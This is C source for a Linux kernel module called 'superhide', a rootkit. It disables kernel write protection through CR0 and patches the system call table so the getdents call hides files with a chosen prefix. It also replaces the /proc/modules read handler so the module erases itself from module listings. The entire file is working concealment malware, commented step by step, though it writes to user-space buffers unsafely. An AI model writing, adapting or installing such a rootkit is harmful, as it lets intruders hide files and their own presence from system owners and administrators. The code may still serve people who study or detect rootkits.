#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/special_insns.h>
#include <linux/string.h>
#include <linux/fs.h>
#include "sysgen.h"

#define GETDENTS_SYSCALL_NUM	78
#define WRITE_PROTECT_FLAG	(1<<16)
#define HIDE_PREFIX		"jordans_secrets."
#define HIDE_PREFIX_SZ		(sizeof(HIDE_PREFIX) - 1)
#define MODULE_NAME		"superhide"
#define MODULE_NAME_SZ		(sizeof(MODULE_NAME) - 1)

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

MODULE_LICENSE("GPL"); // Is actually needed on some distros inorder to link with things

// function type for the getdents handler function
typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
// the original handler
sys_getdents_t sys_getdents_orig = NULL;

// function type for the proc modules read handler
typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
// the original read handler
proc_modules_read_t proc_modules_read_orig = NULL;

// our new getdents handler
asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int boff;
	struct linux_dirent* ent;
	long ret = sys_getdents_orig(fd, dirent, count);
	char* dbuf;
	if (ret <= 0) {
		return ret;
	}
	dbuf = (char*)dirent;
	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);

		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
			|| (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
			// remove this entry by copying everything after it forward
			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
			// and adjust the length reported
			ret -= ent->d_reclen;
		} else {
			// on to the next entry
			boff += ent->d_reclen;
		}
	}
	return ret;
}

// our new /proc/modules read handler
ssize_t proc_modules_read_new(struct file *f, char __user *buf, size_t len, loff_t *offset) {
	char* bad_line = NULL;
	char* bad_line_end = NULL;
	ssize_t ret = proc_modules_read_orig(f, buf, len, offset);
	// search in the buf for MODULE_NAME, and remove that line
	bad_line = strnstr(buf, MODULE_NAME, ret);
	if (bad_line != NULL) {
		// find the end of the line
		for (bad_line_end = bad_line; bad_line_end < (buf + ret); bad_line_end++) {
			if (*bad_line_end == '\n') {
				bad_line_end++; // go past the line end, so we remove that too
				break;
			}
		}
		// copy over the bad line
		memcpy(bad_line, bad_line_end, (buf+ret) - bad_line_end);
		// adjust the size of the return value
		ret -= (ssize_t)(bad_line_end - bad_line);
	}
	
	return ret;
}

// runs on insmod
static int __init lkm_init_module(void) {
	printk(KERN_INFO "superhide loaded\n");

	printk(KERN_INFO "sys_call_table @ %p\n", sys_call_table);
	
	// record the original getdents handler
	sys_getdents_orig = (sys_getdents_t)((void**)sys_call_table)[GETDENTS_SYSCALL_NUM];
	
	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);

	// record the original /proc/modules read handler
	proc_modules_read_orig = proc_modules_operations->read;
	printk(KERN_INFO "original /proc/modules read @ %p\n", proc_modules_read_orig);
	
	// turn write protect off
	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
	
	// add our new handlers
	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;
	proc_modules_operations->read = proc_modules_read_new;

	// turn write protect back on
	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);

	printk(KERN_INFO "New syscall in place\n");
	printk(KERN_INFO "New proc/modules read in place\n");

	

	return 0;
}

// runs on rmmod
static void __exit lkm_cleanup_module(void) {
	printk(KERN_INFO "superhide leaving\n");
	
	// allow us to write to read onlu pages
	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
	// set getdents handler back
	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_orig;
	// set the /proc/modules read back
	proc_modules_operations->read = proc_modules_read_orig;
	// turn write protect back on
	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
	printk(KERN_INFO "Old syscall back\n");
	printk(KERN_INFO "Old proc/modules read back\n");
}

// register the init and exit functions
module_init(lkm_init_module);
module_exit(lkm_cleanup_module);
